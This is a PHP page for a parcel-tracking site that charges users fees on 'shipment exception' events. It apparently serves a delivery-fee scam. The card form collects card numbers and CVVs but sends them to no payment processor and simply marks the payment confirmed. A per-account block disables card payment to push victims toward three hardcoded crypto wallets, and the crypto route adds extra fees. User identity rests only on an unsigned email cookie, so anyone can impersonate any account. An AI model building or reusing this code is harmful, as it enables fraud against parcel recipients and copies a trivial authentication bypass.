<?php
require_once __DIR__ . '/../../../common-sections/globals.php';

if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();
}

function exception_pay_ensure_table(mysqli $conn): void {
    $conn->query(
        "CREATE TABLE IF NOT EXISTS exception_issue_payments (
            id INT UNSIGNED NOT NULL AUTO_INCREMENT,
            event_id INT UNSIGNED NOT NULL,
            tracking_number VARCHAR(80) NOT NULL,
            user_id INT UNSIGNED NOT NULL,
            name VARCHAR(190) NOT NULL,
            email VARCHAR(190) NOT NULL,
            event_title VARCHAR(255) NOT NULL,
            amount DECIMAL(10,2) NOT NULL DEFAULT 0.00,
            payment_for VARCHAR(255) NOT NULL,
            payment_method VARCHAR(20) NOT NULL DEFAULT 'card',
            crypto_asset VARCHAR(30) NULL,
            crypto_wallet_address VARCHAR(255) NULL,
            proof_file_name VARCHAR(255) NULL,
            status VARCHAR(40) NOT NULL DEFAULT 'pending',
            invoice_number VARCHAR(255) NULL,
            created_at_epoch INT NOT NULL,
            updated_at_epoch INT NOT NULL,
            confirmed_at_epoch INT NULL,
            confirmed_by VARCHAR(190) NULL,
            PRIMARY KEY (id),
            KEY idx_exception_payments_event (event_id),
            KEY idx_exception_payments_tracking (tracking_number),
            KEY idx_exception_payments_status (status),
            KEY idx_exception_payments_user (user_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci"
    );
}

function exception_pay_normalize_upload_filename(string $filename): string {
    $filename = trim($filename);
    $filename = preg_replace('/[^\w.\-]+/u', '_', $filename);
    $filename = preg_replace('/_+/', '_', $filename);
    return trim((string)$filename, '._');
}

function exception_pay_clean_text(string $value): string {
    $value = trim($value);
    $value = preg_replace('/\s+/', ' ', $value);
    return (string)$value;
}

function exception_pay_crypto_processing_fee(float $amount): float {
    if ($amount <= 0) return 0.00;
    if ($amount < 400) return 5.00;
    if ($amount < 800) return 7.00;
    return 10.00;
}

exception_pay_ensure_table($conn);

$requestPath = (string)($_SERVER['REQUEST_URI'] ?? '/track/exception/pay/');
$signedIn = !empty($_COOKIE['user_email']) || !empty($_COOKIE['user_Email']) || !empty($_SESSION['email']);
if (!$signedIn) {
    header('Location: /login/?required_login=1&redirect=' . urlencode($requestPath));
    exit();
}

$activeEmail = '';
if (!empty($_SESSION['email'])) {
    $activeEmail = trim((string)$_SESSION['email']);
} elseif (!empty($_COOKIE['user_email'])) {
    $activeEmail = trim((string)$_COOKIE['user_email']);
} elseif (!empty($_COOKIE['user_Email'])) {
    $activeEmail = trim((string)$_COOKIE['user_Email']);
}

$user_id = 0;
$user_name = '';
$user_email = '';
$user_phone = '';
$user_pay_block = '';
$user_pay_block_tittle = '';
$user_pay_block_message = '';
$card_pay_block_error = false;

if ($activeEmail !== '') {
    $stmtUser = $conn->prepare(
        "SELECT id, name, email, phone_number, pay_block, pay_block_tittle, pay_block_message
         FROM users
         WHERE email = ?
         LIMIT 1"
    );
    if ($stmtUser) {
        $stmtUser->bind_param("s", $activeEmail);
        $stmtUser->execute();
        $resUser = $stmtUser->get_result();
        $rowUser = $resUser ? $resUser->fetch_assoc() : null;
        $stmtUser->close();

        if ($rowUser) {
            $user_id = (int)$rowUser['id'];
            $user_name = (string)$rowUser['name'];
            $user_email = (string)$rowUser['email'];
            $user_phone = (string)$rowUser['phone_number'];
            $user_pay_block = trim((string)($rowUser['pay_block'] ?? ''));
            $user_pay_block_tittle = trim((string)($rowUser['pay_block_tittle'] ?? ''));
            $user_pay_block_message = trim((string)($rowUser['pay_block_message'] ?? ''));
        }
    }
}

if ($user_id <= 0) {
    header('Location: /login/?required_login=1&redirect=' . urlencode($requestPath));
    exit();
}

$pay_block_flag = 0;
if ($user_pay_block !== '') {
    $pay_block_flag = is_numeric($user_pay_block) ? (int)$user_pay_block : 1;
}
$effective_pay_block_message = $user_pay_block_message !== '' ? $user_pay_block_message : ($pay_block_flag === 1 ? 'Card payment is currently restricted for your account.' : '');
$effective_pay_block_title = $user_pay_block_tittle !== '' ? $user_pay_block_tittle : 'Card Payment Unavailable';

$tracking_number = trim((string)($_GET['tn'] ?? ''));
$event_id = (int)($_GET['eid'] ?? 0);

$page_error = '';
$page_notice = '';
$page_notice_type = '';
$event = null;
$shipment_status_text = 'In Transit';
$eta_text = '-';
$timeline = [];
$existingPayment = null;

if ($tracking_number === '' || $event_id <= 0) {
    $page_error = 'Invalid payment link.';
} else {
    $stmtEvent = $conn->prepare(
        "SELECT id, tracking_number, event_time_epoch, status_text, event_severity, issue_note, payment_amount, payment_reason,
                location_name, city, state_region, country_code
         FROM shipment_location_events
         WHERE id = ? AND tracking_number = ?
         LIMIT 1"
    );
    if ($stmtEvent) {
        $stmtEvent->bind_param("is", $event_id, $tracking_number);
        $stmtEvent->execute();
        $resEvent = $stmtEvent->get_result();
        $rowEvent = $resEvent ? $resEvent->fetch_assoc() : null;
        $stmtEvent->close();

        if ($rowEvent) {
            $eventEpoch = (int)($rowEvent['event_time_epoch'] ?? 0);
            if ($eventEpoch > 1000000000000) {
                $eventEpoch = (int)($eventEpoch / 1000);
            }

            $parts = [];
            foreach (['location_name', 'city', 'state_region', 'country_code'] as $key) {
                $val = trim((string)($rowEvent[$key] ?? ''));
                if ($val !== '') $parts[] = $key === 'country_code' ? strtoupper($val) : $val;
            }

            $event = [
                'id' => (int)$rowEvent['id'],
                'tracking_number' => (string)$rowEvent['tracking_number'],
                'status_text' => (string)($rowEvent['status_text'] ?? 'Shipment exception'),
                'event_severity' => strtolower(trim((string)($rowEvent['event_severity'] ?? 'negative'))),
                'issue_note' => trim((string)($rowEvent['issue_note'] ?? '')),
                'payment_amount' => (float)($rowEvent['payment_amount'] ?? 0),
                'payment_reason' => trim((string)($rowEvent['payment_reason'] ?? '')),
                'date_text' => $eventEpoch > 0 ? date('F j, Y', $eventEpoch) : '-',
                'time_text' => $eventEpoch > 0 ? date('h:i A', $eventEpoch) : '-',
                'location_text' => $parts ? implode(', ', $parts) : '-'
            ];
        } else {
            $page_error = 'Exception event not found.';
        }
    } else {
        $page_error = 'Unable to load exception payment details.';
    }
}

if ($page_error === '' && $event) {
    try {
        $stmtShip = $conn->prepare(
            "SELECT status, estimated_delivery_time
             FROM shipments
             WHERE tracking_number = ?
             LIMIT 1"
        );
        if ($stmtShip) {
            $stmtShip->bind_param("s", $tracking_number);
            $stmtShip->execute();
            $resShip = $stmtShip->get_result();
            $rowShip = $resShip ? $resShip->fetch_assoc() : null;
            $stmtShip->close();
            if ($rowShip) {
                $shipment_status_text = ucwords(str_replace('_', ' ', (string)($rowShip['status'] ?? 'in_transit')));
                $etaRaw = (string)($rowShip['estimated_delivery_time'] ?? '');
                if ($etaRaw !== '' && ctype_digit($etaRaw)) {
                    $etaEpoch = (int)$etaRaw;
                    if ($etaEpoch > 1000000000000) {
                        $etaEpoch = (int)($etaEpoch / 1000);
                    }
                    $eta_text = date('F j, Y', $etaEpoch);
                } elseif ($etaRaw !== '') {
                    $eta_text = $etaRaw;
                }
            }
        }
    } catch (Throwable $e) {
        $eta_text = '-';
    }

    $stmtTimeline = $conn->prepare(
        "SELECT id, event_time_epoch, status_text, event_severity, location_name, city, state_region, country_code
         FROM shipment_location_events
         WHERE tracking_number = ?
         ORDER BY event_time_epoch DESC, id DESC"
    );
    if ($stmtTimeline) {
        $stmtTimeline->bind_param("s", $tracking_number);
        $stmtTimeline->execute();
        $resTimeline = $stmtTimeline->get_result();
        while ($row = $resTimeline ? $resTimeline->fetch_assoc() : null) {
            if (!$row) break;
            $epoch = (int)($row['event_time_epoch'] ?? 0);
            if ($epoch > 1000000000000) $epoch = (int)($epoch / 1000);
            $place = [];
            foreach (['location_name', 'city', 'state_region', 'country_code'] as $key) {
                $val = trim((string)($row[$key] ?? ''));
                if ($val !== '') $place[] = $key === 'country_code' ? strtoupper($val) : $val;
            }
            $timeline[] = [
                'id' => (int)$row['id'],
                'time_text' => $epoch > 0 ? date('h:i A', $epoch) : '-',
                'date_text' => $epoch > 0 ? date('M j, Y', $epoch) : '-',
                'status_text' => (string)($row['status_text'] ?? 'Shipment update'),
                'event_severity' => strtolower(trim((string)($row['event_severity'] ?? 'neutral'))),
                'location_text' => $place ? implode(', ', $place) : '-'
            ];
        }
        $stmtTimeline->close();
    }

    $stmtExisting = $conn->prepare(
        "SELECT *
         FROM exception_issue_payments
         WHERE event_id = ? AND tracking_number = ? AND user_id = ?
         ORDER BY id DESC
         LIMIT 1"
    );
    if ($stmtExisting) {
        $stmtExisting->bind_param("isi", $event_id, $tracking_number, $user_id);
        $stmtExisting->execute();
        $resExisting = $stmtExisting->get_result();
        $existingPayment = $resExisting ? $resExisting->fetch_assoc() : null;
        $stmtExisting->close();
    }
}

$payment_form = [
    'payment_method' => $existingPayment['payment_method'] ?? 'card',
    'card_type' => '',
    'card_number' => '',
    'card_expiry' => '',
    'card_cvv' => '',
    'cardholder_name' => $user_name,
    'crypto_asset' => $existingPayment['crypto_asset'] ?? 'bitcoin',
    'crypto_wallet_address' => '',
    'proof_file_name' => $existingPayment['proof_file_name'] ?? ''
];

$wallet_map = [
    'bitcoin' => 'bc1qg64q7tnhvuz3hkudhpgwrhldjlnyl6hsrh25ph',
    'ethereum' => '0xe18E91c31Fb74d9124aC7D1F70E55d4C9B576E51',
    'usdt' => 'TLbY4jKJymqGze6jSAvNYtjyLjWdkVswAT'
];
if (!in_array($payment_form['crypto_asset'], ['bitcoin', 'ethereum', 'usdt'], true)) {
    $payment_form['crypto_asset'] = 'bitcoin';
}
$payment_form['crypto_wallet_address'] = $wallet_map[$payment_form['crypto_asset']];

$payment_errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_exception_payment']) && $page_error === '' && $event) {
    $payment_form['payment_method'] = in_array(strtolower(trim((string)($_POST['payment_method'] ?? 'card'))), ['card', 'crypto'], true)
        ? strtolower(trim((string)($_POST['payment_method'] ?? 'card')))
        : 'card';
    $payment_form['card_type'] = exception_pay_clean_text((string)($_POST['card_type'] ?? ''));
    $payment_form['card_number'] = preg_replace('/\s+/', '', (string)($_POST['card_number'] ?? ''));
    $payment_form['card_expiry'] = exception_pay_clean_text((string)($_POST['card_expiry'] ?? ''));
    $payment_form['card_cvv'] = exception_pay_clean_text((string)($_POST['card_cvv'] ?? ''));
    $payment_form['cardholder_name'] = exception_pay_clean_text((string)($_POST['cardholder_name'] ?? ''));
    $postedAsset = strtolower(trim((string)($_POST['crypto_asset'] ?? 'bitcoin')));
    $payment_form['crypto_asset'] = in_array($postedAsset, ['bitcoin', 'ethereum', 'usdt'], true) ? $postedAsset : 'bitcoin';
    $payment_form['crypto_wallet_address'] = $wallet_map[$payment_form['crypto_asset']];

    if ($payment_form['payment_method'] === 'card') {
        if ($pay_block_flag === 1) {
            $card_pay_block_error = true;
            $payment_errors[] = ($effective_pay_block_message !== '' ? $effective_pay_block_message : 'Card payment is currently restricted.') . ' Try other payment methods.';
        }
        if ($payment_form['card_type'] === '') $payment_errors[] = 'Card type is required.';
        if (!preg_match('/^[0-9]{12,19}$/', $payment_form['card_number'])) $payment_errors[] = 'Enter a valid card number.';
        if (!preg_match('/^[0-9]{2}\/[0-9]{2}$/', $payment_form['card_expiry'])) $payment_errors[] = 'Enter card expiry in MM/YY format.';
        if (!preg_match('/^[0-9]{3,4}$/', $payment_form['card_cvv'])) $payment_errors[] = 'Enter a valid CVV.';
        if ($payment_form['cardholder_name'] === '') $payment_errors[] = 'Cardholder name is required.';
    } else {
        $proofFile = $_FILES['crypto_payment_proof'] ?? null;
        $hasExistingProof = trim((string)($existingPayment['proof_file_name'] ?? '')) !== '';
        $hasNewProof = is_array($proofFile) && isset($proofFile['error']) && (int)$proofFile['error'] !== UPLOAD_ERR_NO_FILE;
        if (!$hasExistingProof && !$hasNewProof) {
            $payment_errors[] = 'Upload proof of payment for Other Payment Methods.';
        }
        if ($hasNewProof && (int)$proofFile['error'] !== UPLOAD_ERR_OK) {
            $payment_errors[] = 'Proof of payment upload failed. Please try again.';
        }
    }

    if (!$payment_errors) {
        $storedProofFile = trim((string)($existingPayment['proof_file_name'] ?? ''));
        if ($payment_form['payment_method'] === 'crypto') {
            $proofFile = $_FILES['crypto_payment_proof'] ?? null;
            if (is_array($proofFile) && isset($proofFile['error']) && (int)$proofFile['error'] !== UPLOAD_ERR_NO_FILE) {
                $originalNameRaw = (string)($proofFile['name'] ?? '');
                $normalizedName = exception_pay_normalize_upload_filename($originalNameRaw);
                $ext = strtolower(pathinfo($normalizedName, PATHINFO_EXTENSION));
                $allowedExt = ['pdf', 'jpg', 'jpeg', 'png', 'gif', 'webp'];
                $maxBytes = 10 * 1024 * 1024;

                if ($normalizedName === '' || $ext === '' || !in_array($ext, $allowedExt, true)) {
                    $payment_errors[] = 'Proof of payment must be an image or PDF file.';
                } elseif (!isset($proofFile['size']) || (int)$proofFile['size'] <= 0 || (int)$proofFile['size'] > $maxBytes) {
                    $payment_errors[] = 'Proof of payment must be under 10MB.';
                } else {
                    $tmpPath = (string)($proofFile['tmp_name'] ?? '');
                    $mimeOk = false;
                    if ($tmpPath !== '' && is_file($tmpPath)) {
                        $finfo = @finfo_open(FILEINFO_MIME_TYPE);
                        if ($finfo) {
                            $mime = (string)@finfo_file($finfo, $tmpPath);
                            @finfo_close($finfo);
                            $mimeOk = in_array($mime, ['application/pdf', 'image/jpeg', 'image/png', 'image/gif', 'image/webp'], true);
                        }
                    }
                    if (!$mimeOk) {
                        $payment_errors[] = 'Invalid proof of payment file type.';
                    } else {
                        $uploadDir = __DIR__ . '/../../../shipping/create/payments-upload';
                        if (!is_dir($uploadDir) && !@mkdir($uploadDir, 0755, true)) {
                            $payment_errors[] = 'Could not prepare payment proof upload directory.';
                        } else {
                            $safeBase = pathinfo($normalizedName, PATHINFO_FILENAME);
                            $storedProofFile = time() . '_' . substr(bin2hex(random_bytes(8)), 0, 12) . '_' . $safeBase . '.' . $ext;
                            $targetPath = $uploadDir . '/' . $storedProofFile;
                            if (!@move_uploaded_file($tmpPath, $targetPath)) {
                                $payment_errors[] = 'Could not save proof of payment file.';
                            }
                        }
                    }
                }
            }
        }

        if (!$payment_errors) {
            $now = time();
            $invoiceNumber = 'EINV-' . preg_replace('/[^A-Z0-9]/', '', strtoupper($tracking_number)) . '-' . $event_id;
            $status = $payment_form['payment_method'] === 'crypto' ? 'pending_confirmation' : 'confirmed';
            $confirmedAtEpoch = $status === 'confirmed' ? $now : null;
            $confirmedBy = $status === 'confirmed' ? 'system_card_capture' : null;

            if ($existingPayment) {
                $stmtUpdate = $conn->prepare(
                    "UPDATE exception_issue_payments
                     SET name = ?, email = ?, event_title = ?, amount = ?, payment_for = ?, payment_method = ?, crypto_asset = ?, crypto_wallet_address = ?, proof_file_name = ?, status = ?, invoice_number = ?, updated_at_epoch = ?, confirmed_at_epoch = ?, confirmed_by = ?
                     WHERE id = ?
                     LIMIT 1"
                );
                if ($stmtUpdate) {
                    $cryptoAsset = $payment_form['payment_method'] === 'crypto' ? $payment_form['crypto_asset'] : null;
                    $cryptoWallet = $payment_form['payment_method'] === 'crypto' ? $payment_form['crypto_wallet_address'] : null;
                    $proofName = $payment_form['payment_method'] === 'crypto' ? $storedProofFile : null;
                    $eventTitle = $event['status_text'];
                    $paymentFor = $event['payment_reason'] !== '' ? $event['payment_reason'] : 'Issue clarification payment';
                    $baseAmount = (float)$event['payment_amount'];
                    $cryptoProcessingFee = $payment_form['payment_method'] === 'crypto'
                        ? exception_pay_crypto_processing_fee($baseAmount)
                        : 0.00;
                    $amount = $baseAmount + $cryptoProcessingFee;
                    $paymentMethod = $payment_form['payment_method'];
                    $stmtUpdate->bind_param(
                        "sssdsssssssiisi",
                        $user_name,
                        $user_email,
                        $eventTitle,
                        $amount,
                        $paymentFor,
                        $paymentMethod,
                        $cryptoAsset,
                        $cryptoWallet,
                        $proofName,
                        $status,
                        $invoiceNumber,
                        $now,
                        $confirmedAtEpoch,
                        $confirmedBy,
                        $existingPayment['id']
                    );
                    $stmtUpdate->execute();
                    $stmtUpdate->close();
                }
            } else {
                $stmtInsert = $conn->prepare(
                    "INSERT INTO exception_issue_payments
                    (event_id, tracking_number, user_id, name, email, event_title, amount, payment_for, payment_method, crypto_asset, crypto_wallet_address, proof_file_name, status, invoice_number, created_at_epoch, updated_at_epoch, confirmed_at_epoch, confirmed_by)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                );
                if ($stmtInsert) {
                    $cryptoAsset = $payment_form['payment_method'] === 'crypto' ? $payment_form['crypto_asset'] : null;
                    $cryptoWallet = $payment_form['payment_method'] === 'crypto' ? $payment_form['crypto_wallet_address'] : null;
                    $proofName = $payment_form['payment_method'] === 'crypto' ? $storedProofFile : null;
                    $eventTitle = $event['status_text'];
                    $paymentFor = $event['payment_reason'] !== '' ? $event['payment_reason'] : 'Issue clarification payment';
                    $baseAmount = (float)$event['payment_amount'];
                    $cryptoProcessingFee = $payment_form['payment_method'] === 'crypto'
                        ? exception_pay_crypto_processing_fee($baseAmount)
                        : 0.00;
                    $amount = $baseAmount + $cryptoProcessingFee;
                    $paymentMethod = $payment_form['payment_method'];
                    $stmtInsert->bind_param(
                        "isisssdsssssssiiis",
                        $event_id,
                        $tracking_number,
                        $user_id,
                        $user_name,
                        $user_email,
                        $eventTitle,
                        $amount,
                        $paymentFor,
                        $paymentMethod,
                        $cryptoAsset,
                        $cryptoWallet,
                        $proofName,
                        $status,
                        $invoiceNumber,
                        $now,
                        $now,
                        $confirmedAtEpoch,
                        $confirmedBy
                    );
                    $stmtInsert->execute();
                    $stmtInsert->close();
                }
            }

            header('Location: /track/exception/pay/?tn=' . urlencode($tracking_number) . '&eid=' . $event_id);
            exit();
        }
    }
}

if ($page_error === '' && $event) {
    $stmtLatest = $conn->prepare(
        "SELECT *
         FROM exception_issue_payments
         WHERE event_id = ? AND tracking_number = ? AND user_id = ?
         ORDER BY id DESC
         LIMIT 1"
    );
    if ($stmtLatest) {
        $stmtLatest->bind_param("isi", $event_id, $tracking_number, $user_id);
        $stmtLatest->execute();
        $resLatest = $stmtLatest->get_result();
        $existingPayment = $resLatest ? $resLatest->fetch_assoc() : null;
        $stmtLatest->close();
    }
}
